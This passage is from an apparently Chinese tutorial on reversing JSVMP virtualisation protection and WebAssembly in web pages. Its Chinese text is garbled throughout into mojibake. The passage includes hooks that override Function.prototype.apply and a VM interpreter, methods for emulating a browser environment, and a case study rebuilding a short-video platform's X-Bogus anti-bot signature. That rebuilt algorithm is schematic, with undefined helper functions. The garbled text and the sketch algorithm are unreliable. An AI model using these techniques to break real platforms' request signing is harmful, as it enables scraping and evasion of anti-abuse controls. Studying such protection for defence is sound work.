<li>è¿›ä¸€æ­¥éšè—ä»£ç è¯­ä¹‰</li>
</ul>
</li>
</ol>
<h3>ç›¸æ¯”ä¼ ç»Ÿä¿æŠ¤çš„ä¼˜åŠ¿</h3>
<table>
<thead>
<tr>
  <th>ä¿æŠ¤æ–¹å¼</th>
  <th>å¯ç»•è¿‡æ€§</th>
  <th>å®‰å…¨æ€§</th>
</tr>
</thead>
<tbody>
<tr>
  <td>ä»£ç æ··æ·†</td>
  <td>å¯é€šè¿‡ AST è¿˜åŸ</td>
  <td>ä½</td>
</tr>
<tr>
  <td>ä»£ç åŠ å¯†</td>
  <td>å¯é€šè¿‡ Hook è·å–è§£å¯†åä»£ç </td>
  <td>ä¸­</td>
</tr>
<tr>
  <td>åè°ƒè¯•</td>
  <td>å¯ç§»é™¤åè°ƒè¯•ä»£ç </td>
  <td>ä½</td>
</tr>
<tr>
  <td><strong>JSVMP</strong></td>
  <td><strong>ç§»é™¤è§£é‡Šå™¨ä¼šå¯¼è‡´åŠŸèƒ½å®Œå…¨ä¸§å¤±</strong></td>
  <td><strong>é«˜</strong></td>
</tr>
</tbody>
</table>
<p>JSVMP å°†ç›®æ ‡ä»£ç è½¬æ¢ä¸ºè‡ªå®šä¹‰å­—èŠ‚ç ï¼Œç ´åäº†æ–‡æœ¬è¯­æ³•å±æ€§ï¼Œéšè—äº†å…³é”®é€»è¾‘ã€‚ä¸åè°ƒè¯•æˆ–åŠ å¯†ç­‰å¯ä»¥é€šè¿‡ç§»é™¤ä¿æŠ¤ç»“æ„æ¥ç»•è¿‡çš„æ–¹æ³•ä¸åŒï¼Œç§»é™¤ JSVMP è§£é‡Šå™¨ä¼šå¯¼è‡´åŸå§‹åŠŸèƒ½å®Œå…¨å¤±å»æ¢å¤èƒ½åŠ›ã€‚</p>
<hr />
<h2>JSVMP é€†å‘åˆ†ææ–¹æ³•</h2>
<h3>ä¸‰ç§ä¸»è¦é€†å‘æ–¹æ³•ï¼ˆ2025ï¼‰</h3>
<p>ç›®å‰é’ˆå¯¹ JSVMP çš„é€†å‘ä¸»è¦æœ‰ä¸‰ç§æ–¹æ³•ï¼š</p>
<ol>
<li><p><strong>RPC è¿œç¨‹è°ƒç”¨</strong></p>
<ul>
<li>åœ¨çœŸå®æµè§ˆå™¨ç¯å¢ƒä¸­æ‰§è¡Œ JSVMP ä¿æŠ¤çš„å‡½æ•°</li>
<li>é€šè¿‡ç½‘ç»œæ¥å£æš´éœ²åŠŸèƒ½</li>
<li>ä¼˜ç‚¹ï¼šå®ç°ç®€å•ï¼Œç¨³å®šæ€§é«˜</li>
<li>ç¼ºç‚¹ï¼šéœ€è¦ç»´æŠ¤æµè§ˆå™¨ç¯å¢ƒï¼Œæ€§èƒ½å¼€é”€å¤§</li>
</ul>
</li>
<li><p><strong>ç¯å¢ƒè¡¥å……ï¼ˆè¡¥ç¯å¢ƒï¼‰</strong></p>
<ul>
<li>åœ¨ Node.js ä¸­æ¨¡æ‹Ÿæµè§ˆå™¨ç¯å¢ƒ</li>
<li>è¡¥å……ç¼ºå¤±çš„ DOMã€BOM API</li>
<li>ä¼˜ç‚¹ï¼šæ‰§è¡Œæ•ˆç‡é«˜</li>
<li>ç¼ºç‚¹ï¼šéœ€è¦å¤§é‡ç¯å¢ƒé€‚é…å·¥ä½œ</li>
</ul>
</li>
<li><p><strong>æ’æ¡©è¿˜åŸç®—æ³•</strong></p>
<ul>
<li>é€šè¿‡æ—¥å¿—è¾“å‡ºå…³é”®å‚æ•°</li>
<li>ä»ç»“æœåæ¨ç”Ÿæˆé€»è¾‘</li>
<li>å®ç°çº¯ç®—æ³•è¿˜åŸ</li>
<li>ä¼˜ç‚¹ï¼šä¸ä¾èµ–åŸå§‹ä»£ç ï¼Œå¯ç§»æ¤æ€§å¼º</li>
<li>ç¼ºç‚¹ï¼šå·¥ä½œé‡å¤§ï¼Œéœ€è¦æ·±å…¥ç†è§£ç®—æ³•</li>
</ul>
</li>
</ol>
<h3>å…³é”®è°ƒè¯•æŠ€å·§</h3>
<h4>1. AST åæ··æ·†</h4>
<p>ä½¿ç”¨å·¥å…·å¯¹æ··æ·†ä»£ç è¿›è¡Œè¿˜åŸï¼š</p>
<pre><code class="language-javascript">// ä½¿ç”¨ v_jstools æ’ä»¶è¿›è¡Œ AST åæ··æ·†
// å®‰è£…ï¼šnpm install v_jstools

const parser = require(&quot;@babel/parser&quot;);
const traverse = require(&quot;@babel/traverse&quot;).default;
const generator = require(&quot;@babel/generator&quot;).default;
const fs = require(&quot;fs&quot;);

// è¯»å–æ··æ·†ä»£ç 
const code = fs.readFileSync(&quot;obfuscated.js&quot;, &quot;utf-8&quot;);
const ast = parser.parse(code);

// è¿›è¡Œ AST è½¬æ¢
traverse(ast, {
  // æ·»åŠ åæ··æ·†è§„åˆ™
});

// ç”Ÿæˆè¿˜åŸåçš„ä»£ç 
const output = generator(ast).code;
fs.writeFileSync(&quot;deobfuscated.js&quot;, output);
</code></pre>
<h4>2. æ’æ¡©/æ—¥å¿—è®°å½•</h4>
<p>åœ¨å…³é”®ä½ç½®æ’å…¥æ—¥å¿—ï¼Œè¾“å‡ºå…³é”®å‚æ•°ä¿¡æ¯ï¼š</p>
<pre><code class="language-javascript">// åŸå§‹ JSVMP è§£é‡Šå™¨ä»£ç ï¼ˆç¤ºä¾‹ï¼‰
function vmExecute(bytecode, context) {
  // æ’æ¡©ï¼šè®°å½•å­—èŠ‚ç æ‰§è¡Œè¿‡ç¨‹
  console.log(&quot;Executing bytecode:&quot;, bytecode);
  console.log(&quot;Context:&quot;, JSON.stringify(context));

  let pc = 0;
  while (pc &lt; bytecode.length) {
    const opcode = bytecode[pc];

    // æ’æ¡©ï¼šè®°å½•æ¯æ¡æŒ‡ä»¤
    console.log(`PC: ${pc}, Opcode: ${opcode}`);

    switch (opcode) {
      case OP_LOAD:
        // æ’æ¡©ï¼šè®°å½•åŠ è½½æ“ä½œ
        console.log(&quot;LOAD operation:&quot;, bytecode[pc + 1]);
        break;
      // ... å…¶ä»–æŒ‡ä»¤
    }
    pc++;
  }
}
</code></pre>
<h4>3. æµè§ˆå™¨æ›¿æ¢å‡½æ•°</h4>
<p>ä½¿ç”¨æµè§ˆå™¨çš„èµ„æºè¦†ç›–åŠŸèƒ½è°ƒè¯•ï¼š</p>
<pre><code class="language-javascript">// åœ¨ Chrome DevTools ä¸­ä½¿ç”¨ Overrides åŠŸèƒ½
// 1. æ‰“å¼€ DevTools â†’ Sources â†’ Overrides
// 2. é€‰æ‹©æœ¬åœ°æ–‡ä»¶å¤¹
// 3. ä¿®æ”¹ JS æ–‡ä»¶å¹¶ä¿å­˜
// 4. åˆ·æ–°é¡µé¢æµ‹è¯•ä¿®æ”¹åçš„ä»£ç 

// ç¤ºä¾‹ï¼šHook JSVMP è§£é‡Šå™¨
(function () {
  const originalVMExecute = window.vmExecute;
  window.vmExecute = function (...args) {
    console.log(&quot;VM Execute called with:&quot;, args);
    const result = originalVMExecute.apply(this, args);
    console.log(&quot;VM Execute result:&quot;, result);
    return result;
  };
})();
</code></pre>
<h4>4. åŠ¨æ€åˆ†æ</h4>
<p>ä½¿ç”¨è°ƒè¯•å™¨æ•è·è¿è¡Œæ—¶æŒ‡ä»¤æµï¼š</p>
<pre><code class="language-javascript">// åœ¨å…³é”®ä½ç½®è®¾ç½®æ–­ç‚¹
// ä½¿ç”¨ Chrome DevTools çš„æ¡ä»¶æ–­ç‚¹åŠŸèƒ½

// æ¡ä»¶æ–­ç‚¹ç¤ºä¾‹ï¼š
// å½“æŸä¸ªå˜é‡ç­‰äºç‰¹å®šå€¼æ—¶æš‚åœ
if (context.register[0] === 0x1234) {
  debugger;
}

// è®°å½•æ‰§è¡Œè·¯å¾„
const executionTrace = [];
function traceExecution(pc, opcode) {
  executionTrace.push({ pc, opcode, timestamp: Date.now() });
}
</code></pre>
<h4>5. Apply æ–¹æ³•è¿½è¸ª</h4>
<p>é’ˆå¯¹ä½¿ç”¨ apply çš„å¾ªç¯ä»£ç è¿›è¡Œåˆ†æï¼š</p>
<pre><code class="language-javascript">// Hook Function.prototype.apply
const originalApply = Function.prototype.apply;
Function.prototype.apply = function (thisArg, args) {
  // è®°å½• apply è°ƒç”¨
  console.log(&quot;Apply called:&quot;);
  console.log(&quot;  Function:&quot;, this.name || &quot;anonymous&quot;);
  console.log(&quot;  This:&quot;, thisArg);
  console.log(&quot;  Args:&quot;, args);

  // è°ƒç”¨åŸå§‹æ–¹æ³•
  const result = originalApply.call(this, thisArg, args);

  console.log(&quot;  Result:&quot;, result);
  return result;
};

// åœ¨æ—¥å¿—ä¸­åˆ†æç®—æ³•é€»è¾‘ï¼Œé¿å…å¤§é‡åŠ¨æ€è°ƒè¯•
</code></pre>
<hr />
<h2>å®æˆ˜æ¡ˆä¾‹åˆ†æ</h2>
<h3>æ¡ˆä¾‹ï¼šæŸéŸ³ X-Bogus å‚æ•°åˆ†æ</h3>
<p>æŸçŸ­è§†é¢‘å¹³å°ä½¿ç”¨ JSVMP ä¿æŠ¤å…¶ X-Bogus å‚æ•°ç”Ÿæˆç®—æ³•ï¼Œä»¥ä¸‹æ˜¯é€†å‘åˆ†æçš„æ­¥éª¤ï¼š</p>
<h4>æ­¥éª¤ 1ï¼šå®šä½ JSVMP è§£é‡Šå™¨</h4>
<pre><code class="language-javascript">// æœç´¢ç‰¹å¾ä»£ç 
// 1. æŸ¥æ‰¾ WebAssembly å®ä¾‹åŒ–ä»£ç 
const wasmMatch = code.match(/WebAssembly\.instantiate/);

// 2. æŸ¥æ‰¾å¤§é‡çš„ switch-case ç»“æ„ï¼ˆDispatcher ç‰¹å¾ï¼‰
const switchMatch = code.match(/switch\s*\(\s*\w+\s*\)\s*\{/g);

// 3. æŸ¥æ‰¾å­—èŠ‚ç æ•°ç»„ï¼ˆé€šå¸¸æ˜¯å¤§å‹ Uint8Arrayï¼‰
const bytecodeMatch = code.match(/new\s+Uint8Array\(\[[\d,\s]+\]\)/);
</code></pre>
<h4>æ­¥éª¤ 2ï¼šæ’æ¡©åˆ†æ</h4>
<pre><code class="language-javascript">// åœ¨ Dispatcher ä¸­æ’å…¥æ—¥å¿—
function dispatcher(opcode, operand) {
  console.log(`Opcode: 0x${opcode.toString(16)}, Operand: ${operand}`);

  switch (opcode) {
    case 0x01: // LOAD
      console.log(&quot;  Action: LOAD from&quot;, operand);
      break;
    case 0x02: // STORE
      console.log(&quot;  Action: STORE to&quot;, operand);
      break;
    case 0x10: // ADD
      console.log(&quot;  Action: ADD&quot;);
      break;
    // ... æ›´å¤šæŒ‡ä»¤
  }
}
</code></pre>
<h4>æ­¥éª¤ 3ï¼šç®—æ³•è¿˜åŸ</h4>
<p>åŸºäºæ—¥å¿—åˆ†æï¼Œè¿˜åŸæ ¸å¿ƒç®—æ³•ï¼š</p>
<pre><code class="language-javascript">// ä» JSVMP å­—èŠ‚ç æ‰§è¡Œæ—¥å¿—ä¸­è¿˜åŸçš„ç®—æ³•
function generateXBogus(params) {
  // æ­¥éª¤ 1: å‚æ•°åºåˆ—åŒ–
  const serialized = serializeParams(params);

  // æ­¥éª¤ 2: MD5 å“ˆå¸Œ
  const hash = md5(serialized);

  // æ­¥éª¤ 3: æ—¶é—´æˆ³å¤„ç†
  const timestamp = Math.floor(Date.now() / 1000);

  // æ­¥éª¤ 4: æ··åˆç¼–ç 
  const mixed = mixEncode(hash, timestamp);

  // æ­¥éª¤ 5: Base64 å˜ç§ç¼–ç 
  const encoded = customBase64(mixed);

  return encoded;
}

// è¾…åŠ©å‡½æ•°å®ç°
function serializeParams(params) {
  return Object.keys(params)
    .sort()
    .map((key) =&gt; `${key}=${params[key]}`)
    .join(&quot;&amp;&quot;);
}

function mixEncode(hash, timestamp) {
  const result = [];
  for (let i = 0; i &lt; hash.length; i++) {
    result.push(hash.charCodeAt(i) ^ (timestamp &amp; 0xff));
  }
  return result;
}
</code></pre>
<hr />
<h2>æœ€ä½³å®è·µ</h2>
<h3>å¯¹äºå¼€å‘è€…ï¼ˆå®æ–½ä¿æŠ¤ï¼‰</h3>
<ol>
<li><p><strong>åˆç†é€‰æ‹©ä¿æŠ¤èŒƒå›´</strong></p>
<ul>
<li>ä»…å¯¹æ ¸å¿ƒç®—æ³•å’Œæ•æ„Ÿé€»è¾‘ä½¿ç”¨ JSVMP</li>
<li>é¿å…ä¿æŠ¤æ•´ä¸ªåº”ç”¨ï¼Œå½±å“æ€§èƒ½å’Œè°ƒè¯•</li>
<li>è€ƒè™‘ä¿æŠ¤ç²’åº¦ä¸æ€§èƒ½çš„å¹³è¡¡</li>
</ul>
</li>
<li><p><strong>æ€§èƒ½ä¼˜åŒ–</strong></p>
<ul>
<li>ä½¿ç”¨ WebAssembly å®ç°è§£é‡Šå™¨ä»¥æå‡æ€§èƒ½</li>
<li>å¯¹çƒ­ç‚¹ä»£ç è·¯å¾„è¿›è¡Œä¼˜åŒ–</li>
<li>å®ç°æŒ‡ä»¤ç¼“å­˜æœºåˆ¶</li>
</ul>
</li>
<li><p><strong>å¤šå±‚é˜²æŠ¤</strong></p>
<ul>
<li>JSVMP ç»“åˆä»£ç æ··æ·†</li>
<li>æ·»åŠ åè°ƒè¯•å’Œç¯å¢ƒæ£€æµ‹</li>
<li>å®æ–½å®Œæ•´æ€§æ ¡éªŒ</li>
</ul>
</li>
</ol>
<h3>å¯¹äºé€†å‘åˆ†æè€…</h3>
<ol>
<li><p><strong>é€‰æ‹©åˆé€‚çš„é€†å‘æ–¹æ³•</strong></p>
<ul>
<li>ç®€å•åœºæ™¯ä½¿ç”¨ RPC è°ƒç”¨</li>
<li>å¤æ‚åœºæ™¯è€ƒè™‘ç®—æ³•è¿˜åŸ</li>
<li>æ ¹æ®å…·ä½“éœ€æ±‚æƒè¡¡æˆæœ¬å’Œæ”¶ç›Š</li>
</ul>
</li>
<li><p><strong>å·¥å…·åŒ–åˆ†ææµç¨‹</strong></p>
<ul>
<li>å¼€å‘è‡ªåŠ¨åŒ–æ’æ¡©å·¥å…·</li>
<li>å»ºç«‹ JSVMP ç‰¹å¾åº“</li>
<li>ç§¯ç´¯å¸¸è§æŒ‡ä»¤é›†æ¨¡å¼</li>
</ul>
</li>
<li><p><strong>å›¢é˜Ÿåä½œ</strong></p>
<ul>
<li>åˆ†äº« JSVMP è§£é‡Šå™¨ç‰¹å¾</li>
<li>å…±äº«é€†å‘å·¥å…·å’Œè„šæœ¬</li>
<li>å»ºç«‹æ¡ˆä¾‹çŸ¥è¯†åº“</li>
</ul>
</li>
</ol>
<hr />
<h2>å¸¸è§é—®é¢˜</h2>
<h3>Q: JSVMP ä¼šæ˜¾è‘—å½±å“ç½‘é¡µæ€§èƒ½å—ï¼Ÿ</h3>
<p><strong>A</strong>: ä¼šæœ‰ä¸€å®šå½±å“ã€‚JSVMP å°†åŸç”Ÿ JavaScript æ‰§è¡Œè½¬æ¢ä¸ºè™šæ‹Ÿæœºè§£é‡Šæ‰§è¡Œï¼Œä¼šå¸¦æ¥æ€§èƒ½å¼€é”€ã€‚æ ¹æ®å®ç°æ–¹å¼ä¸åŒï¼Œæ€§èƒ½æŸå¤±é€šå¸¸åœ¨ 2-10 å€ä¹‹é—´ã€‚ä½¿ç”¨ WebAssembly å®ç°çš„è§£é‡Šå™¨æ€§èƒ½æŸå¤±è¾ƒå°ï¼ˆ2-3 å€ï¼‰ï¼Œçº¯ JavaScript å®ç°å¯èƒ½è¾¾åˆ° 5-10 å€ã€‚å› æ­¤å»ºè®®ä»…å¯¹æ ¸å¿ƒç®—æ³•ä½¿ç”¨ JSVMPï¼Œè€Œéæ•´ä¸ªåº”ç”¨ã€‚</p>
<h3>Q: JSVMP ä¿æŠ¤æ˜¯å¦ç»å¯¹å®‰å…¨ï¼Ÿ</h3>
<p><strong>A</strong>: æ²¡æœ‰ç»å¯¹å®‰å…¨çš„ä¿æŠ¤ã€‚JSVMP å¤§å¹…å¢åŠ äº†é€†å‘åˆ†æçš„éš¾åº¦å’Œæˆæœ¬ï¼Œä½†ä»ç„¶å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ç»•è¿‡ï¼š</p>
<ul>
<li>RPC è¿œç¨‹è°ƒç”¨ï¼ˆé»‘ç›’ä½¿ç”¨ï¼‰</li>
<li>æ·±åº¦æ’æ¡©åˆ†æè¿˜åŸç®—æ³•</li>
<li>å†…å­˜åˆ†æå’ŒåŠ¨æ€è°ƒè¯•</li>
<li>æœºå™¨å­¦ä¹ è¾…åŠ©çš„æ¨¡å¼è¯†åˆ«</li>
</ul>
<p>JSVMP çš„ç›®æ ‡æ˜¯æé«˜æ”»å‡»æˆæœ¬ï¼Œè€Œéå®Œå…¨é˜²æ­¢é€†å‘ã€‚</p>
<h3>Q: å¦‚ä½•æ£€æµ‹ä»£ç æ˜¯å¦ä½¿ç”¨äº† JSVMPï¼Ÿ</h3>
<p><strong>A</strong>: å¯ä»¥é€šè¿‡ä»¥ä¸‹ç‰¹å¾è¯†åˆ«ï¼š</p>
<ul>
<li>å­˜åœ¨å¤§é‡ switch-case ç»“æ„ï¼ˆDispatcherï¼‰</li>
<li>åŒ…å« WebAssembly æ¨¡å—å®ä¾‹åŒ–</li>
<li>å­˜åœ¨å¤§å‹çš„å­—èŠ‚ç æ•°ç»„ï¼ˆUint8Arrayï¼‰</li>
<li>å‡½æ•°è°ƒç”¨è¢«æ›¿æ¢ä¸ºè™šæ‹Ÿæœºæ‰§è¡Œè°ƒç”¨</li>
<li>ä»£ç ä¸­å­˜åœ¨æ˜æ˜¾çš„è™šæ‹Ÿå¯„å­˜å™¨å’Œè™šæ‹Ÿæ ˆæ“ä½œ</li>
</ul>
<h3>Q: JSVMP ä¸ä»£ç æ··æ·†çš„åŒºåˆ«ï¼Ÿ</h3>
<p><strong>A</strong>: ä¸»è¦åŒºåˆ«ï¼š</p>
<table>
<thead>
<tr>
  <th>ç‰¹æ€§</th>
  <th>ä»£ç æ··æ·†</th>
  <th>JSVMP</th>
</tr>
</thead>
<tbody>
<tr>
  <td>åŸç†</td>
  <td>é‡å‘½åã€æ§åˆ¶æµå¹³å¦åŒ–ç­‰</td>
  <td>ä»£ç è™šæ‹ŸåŒ–</td>
</tr>
<tr>
  <td>å¯è¯»æ€§</td>
  <td>é™ä½ä½†ä»å¯ç†è§£</td>
  <td>å®Œå…¨å¤±å»è¯­æ³•å±æ€§</td>
</tr>
<tr>
  <td>æ‰§è¡Œæ–¹å¼</td>
  <td>ç›´æ¥æ‰§è¡Œ</td>
  <td>è™šæ‹Ÿæœºè§£é‡Šæ‰§è¡Œ</td>
</tr>
<tr>
  <td>æ€§èƒ½å½±å“</td>
  <td>è¾ƒå°ï¼ˆ0-50%ï¼‰</td>
  <td>è¾ƒå¤§ï¼ˆ2-10 å€ï¼‰</td>
</tr>
<tr>
  <td>é€†å‘éš¾åº¦</td>
  <td>ä¸­</td>
  <td>é«˜</td>
</tr>
<tr>
  <td>å¯è¿˜åŸæ€§</td>
  <td>AST å¯éƒ¨åˆ†è¿˜åŸ</td>
  <td>éš¾ä»¥å®Œå…¨è¿˜åŸ</td>
</tr>
</tbody>
</table>
<h3>Q: å­¦ä¹  JSVMP é€†å‘éœ€è¦å“ªäº›åŸºç¡€ï¼Ÿ</h3>
<p><strong>A</strong>: å»ºè®®æŒæ¡ä»¥ä¸‹çŸ¥è¯†ï¼š</p>
<ul>
<li>JavaScript è¯­è¨€æ·±å…¥ç†è§£ï¼ˆä½œç”¨åŸŸã€é—­åŒ…ã€åŸå‹é“¾ç­‰ï¼‰</li>
<li>ç¼–è¯‘åŸç†åŸºç¡€ï¼ˆè¯æ³•åˆ†æã€è¯­æ³•åˆ†æã€ASTï¼‰</li>
<li>è™šæ‹ŸæœºåŸç†ï¼ˆæŒ‡ä»¤é›†ã€è§£é‡Šå™¨ã€å­—èŠ‚ç ï¼‰</li>
<li>WebAssembly åŸºç¡€</li>
<li>é€†å‘å·¥ç¨‹æ€ç»´å’Œæ–¹æ³•</li>
<li>ç†Ÿç»ƒä½¿ç”¨æµè§ˆå™¨å¼€å‘è€…å·¥å…·</li>
</ul>
<hr />
<h2>è¿›é˜¶é˜…è¯»</h2>
<h3>å­¦æœ¯è®ºæ–‡</h3>
<ul>
<li>åŒ¡å‡¯å…ƒ. ã€ŠåŸºäº WebAssembly çš„ JavaScript ä»£ç è™šæ‹ŸåŒ–ä¿æŠ¤æ–¹æ³•ç ”ç©¶ä¸å®ç°ã€‹. è¥¿åŒ—å¤§å­¦ç¡•å£«è®ºæ–‡, 2018</li>
<li>Stephen Fewer. ã€ŠVirtual Machine Based Obfuscationã€‹. 2006</li>
</ul>
<h3>æŠ€æœ¯åšå®¢</h3>
<ul>
<li><a href="https://blog.jsvmp.com/jsjiamihejsvmpyuanlifenx/">æ·±å…¥äº†è§£ JS åŠ å¯†æŠ€æœ¯åŠ JSVMP ä¿æŠ¤åŸç†åˆ†æ</a></li>
<li><a href="https://blog.jsvmp.com/jsxunihua/">JS è™šæ‹ŸåŒ–ä»£ç è™šæ‹ŸåŒ–ä¿æŠ¤åŸç†åˆ†æ</a></li>
<li><a href="https://blog.csdn.net/Awesome_py/article/details/136652368">JSVMP åˆ†æ - CSDN</a></li>
<li><a href="https://blog.csdn.net/liu_yueyang/article/details/149280146">JavaScript VMP åˆ†æä¸è°ƒè¯•</a></li>
<li><a href="https://blog.csdn.net/weixin_43114209/article/details/150575091">VMPï¼ˆè™šæ‹Ÿæœºä¿æŠ¤ï¼‰åŸç†ã€å·¥ç¨‹è½åœ°ã€æ€§èƒ½æƒè¡¡ä¸ç©å…·å®ç°</a></li>
</ul>
<h3>å®æˆ˜æ¡ˆä¾‹</h3>
<ul>
<li><a href="https://www.cnblogs.com/ikdl/p/16807224.html">æŸéŸ³ X-Bogus é€†å‘åˆ†æï¼ŒJSVMP çº¯ç®—æ³•è¿˜åŸ</a></li>
<li><a href="https://blog.csdn.net/jerry3747/article/details/130889462">JSVMP é€†å‘å®æˆ˜ x-sã€x-t ç®—æ³•è¿˜åŸ</a></li>
<li><a href="https://www.resourch.com/archives/95.html">JSVMP ç¼–è¯‘ä¸åç¼–è¯‘è¯¦è§£</a></li>
<li><a href="https://blog.csdn.net/qq_59848320/article/details/132722222">JSVMP é€†å‘ï¼ˆè¡¥ç¯å¢ƒç¯‡ï¼‰</a></li>
</ul>
<h3>å¼€æºé¡¹ç›®</h3>
<ul>
<li><a href="https://github.com/patriksimek/vm2">vm2</a> - Node.js æ²™ç®±è™šæ‹Ÿæœº</li>
<li><a href="https://github.com/gf3/sandbox">js-sandbox</a> - JavaScript æ²™ç®±</li>
<li><a href="https://emscripten.org/">Emscripten</a> - C/C++ åˆ° WebAssembly ç¼–è¯‘å™¨</li>
</ul>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-36">WebAssembly é€†å‘</a> - WebAssembly æŠ€æœ¯åŸºç¡€</li>
<li>JavaScript åæ··æ·† - ä»£ç åæ··æ·†æŠ€æœ¯</li>
<li><a href="#section-22">AST è§£æå’Œæ“ä½œ</a> - AST å·¥å…·ä½¿ç”¨</li>
<li><a href="#section-26">æµè§ˆå™¨è°ƒè¯•æŠ€å·§</a> - é«˜çº§è°ƒè¯•æ–¹æ³•</li>
<li><a href="#section-38">å‰ç«¯åŠ å›ºæŠ€æœ¯</a> - å…¶ä»–å‰ç«¯ä¿æŠ¤æŠ€æœ¯</li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-36">
                                                <h2>[R35] WebAssembly Reversing</h2>
                                                <h1>R35: WebAssembly é€†å‘</h1>
<h2>ğŸ’­ æ€è€ƒæ—¶åˆ»</h2>
<p>åœ¨æ·±å…¥ WebAssembly é€†å‘ä¹‹å‰ï¼Œå…ˆæŒ‘æˆ˜ä¸€ä¸‹ä½ çš„è®¤çŸ¥ï¼š</p>
<ol>
<li><strong>ä¸ºä»€ä¹ˆ JavaScript è¿˜ä¸å¤Ÿå¿«ï¼Ÿ</strong> ä»€ä¹ˆåœºæ™¯ä¸‹éœ€è¦ç”¨åˆ° WebAssemblyï¼Ÿ</li>
<li><strong>ç¼–è¯‘åçš„ä»£ç å°±å®‰å…¨äº†å—ï¼Ÿ</strong> äºŒè¿›åˆ¶æ ¼å¼çœŸçš„æ¯” JavaScript æ›´éš¾é€†å‘å—ï¼Ÿ</li>
<li><strong>ä½ èƒ½åç¼–è¯‘ .exe æ–‡ä»¶å—ï¼Ÿ</strong> WebAssembly å’Œä¼ ç»Ÿçš„äºŒè¿›åˆ¶æ–‡ä»¶æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</li>
<li><strong>å®æˆ˜åœºæ™¯ï¼š</strong> æŸè§†é¢‘ç½‘ç«™æŠŠè§£å¯†ç®—æ³•ç¼–è¯‘æˆäº† WebAssemblyï¼ŒåŠ å¯†å‚æ•°ç»è¿‡ Wasm å¤„ç†åå‘é€ç»™æœåŠ¡å™¨ã€‚ä½ ä¼šå¦‚ä½•ä¸‹æ‰‹åˆ†æï¼Ÿ</li>
</ol>
<p>WebAssembly å¹¶ä¸æ˜¯é€†å‘çš„ç»ˆç‚¹ï¼Œè€Œæ˜¯æ–°çš„èµ·ç‚¹ã€‚</p>
<hr />
<h2>æ¦‚è¿°</h2>
<p>WebAssembly (Wasm) æ˜¯ä¸€ç§ä½çº§å­—èŠ‚ç æ ¼å¼ï¼Œæ—¨åœ¨åœ¨ Web æµè§ˆå™¨ä¸­ä»¥æ¥è¿‘åŸç”Ÿçš„æ€§èƒ½è¿è¡Œä»£ç ã€‚è¶Šæ¥è¶Šå¤šçš„ Web åº”ç”¨ä½¿ç”¨ WebAssembly æ¥ä¿æŠ¤æ ¸å¿ƒç®—æ³•å’Œæå‡æ€§èƒ½ï¼Œè¿™ä¹Ÿç»™é€†å‘å·¥ç¨‹å¸¦æ¥äº†æ–°çš„æŒ‘æˆ˜ã€‚</p>
<hr />
<h2>åŸºç¡€æ¦‚å¿µ</h2>
<h3>å®šä¹‰</h3>
<p><strong>WebAssembly (Wasm)</strong> æ˜¯ä¸€ç§é¢å‘å †æ ˆçš„è™šæ‹Ÿæœºçš„äºŒè¿›åˆ¶æŒ‡ä»¤æ ¼å¼ã€‚å®ƒè¢«è®¾è®¡ä¸º C/C++/Rust ç­‰é«˜çº§è¯­è¨€çš„å¯ç§»æ¤ç¼–è¯‘ç›®æ ‡ï¼Œèƒ½å¤Ÿåœ¨ Web ä¸Šä»¥æ¥è¿‘åŸç”Ÿæ€§èƒ½è¿è¡Œã€‚</p>
<p><strong>å…³é”®ç‰¹ç‚¹</strong>:</p>
<ul>
<li>äºŒè¿›åˆ¶æ ¼å¼ï¼Œä½“ç§¯å°ï¼ŒåŠ è½½å¿«</li>
<li>åŸºäºå †æ ˆçš„è™šæ‹Ÿæœº</li>
<li>å¼ºç±»å‹ç³»ç»Ÿ</li>
<li>æ²™ç®±æ‰§è¡Œç¯å¢ƒ</li>
<li>ä¸ JavaScript äº’æ“ä½œ</li>
</ul>
<h3>æ ¸å¿ƒåŸç†</h3>
<h4>1. æ¨¡å—ç»“æ„</h4>
<p>WebAssembly æ¨¡å—ç”±å¤šä¸ªéƒ¨åˆ†ç»„æˆï¼š</p>
<pre><code class="language-mermaid">graph TD
    subgraph Wasm[&quot;WebAssembly æ¨¡å—ç»“æ„&quot;]
        Header[Magic Number&lt;br/&gt;0x00 0x61 0x73 0x6d&lt;br/&gt;Version: 0x01 0x00 0x00 0x00]

        Type[Type Section&lt;br/&gt;ç±»å‹å®šä¹‰&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ å‡½æ•°ç­¾å&lt;br/&gt;â€¢ å‚æ•°ç±»å‹&lt;br/&gt;â€¢ è¿”å›å€¼ç±»å‹]

        Import[Import Section&lt;br/&gt;å¯¼å…¥å£°æ˜&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ å¯¼å…¥å‡½æ•°&lt;br/&gt;â€¢ å¯¼å…¥å†…å­˜&lt;br/&gt;â€¢ å¯¼å…¥è¡¨&lt;br/&gt;â€¢ å¯¼å…¥å…¨å±€å˜é‡]

        Function[Function Section&lt;br/&gt;å‡½æ•°ç­¾åç´¢å¼•&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;å¼•ç”¨ Type Section]

        Table[Table Section&lt;br/&gt;é—´æ¥å‡½æ•°è¡¨&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ å‡½æ•°æŒ‡é’ˆ&lt;br/&gt;â€¢ è¡¨å¤§å°]

        Memory[Memory Section&lt;br/&gt;çº¿æ€§å†…å­˜&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ åˆå§‹é¡µæ•°&lt;br/&gt;â€¢ æœ€å¤§é¡µæ•°&lt;br/&gt;â€¢ é¡µå¤§å°: 64KB]

        Global[Global Section&lt;br/&gt;å…¨å±€å˜é‡&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ ç±»å‹&lt;br/&gt;â€¢ åˆå§‹å€¼&lt;br/&gt;â€¢ å¯å˜æ€§]

        Export[Export Section&lt;br/&gt;å¯¼å‡ºå£°æ˜&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ å¯¼å‡ºå‡½æ•°&lt;br/&gt;â€¢ å¯¼å‡ºå†…å­˜&lt;br/&gt;â€¢ å¯¼å‡ºè¡¨&lt;br/&gt;â€¢ å¯¼å‡ºå…¨å±€å˜é‡]

